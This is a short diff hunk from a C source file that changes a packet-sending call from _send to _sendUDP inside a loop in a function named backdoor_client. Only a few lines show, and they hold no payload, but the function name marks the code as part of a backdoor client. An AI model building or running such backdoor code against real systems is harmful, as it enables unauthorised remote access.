@@ -81,7 +81,7 @@ void backdoor_client(uint32 ipaddr, int dport, int duplex)
 
 //			printf("Src: %d\n", src_port);
 			
-			_send(ipaddr, src_port, dst_port, TRUE);
+			_sendUDP(ipaddr, src_port, dst_port, TRUE);
 			
 			usleep(SLEEP_TIME);
 		}
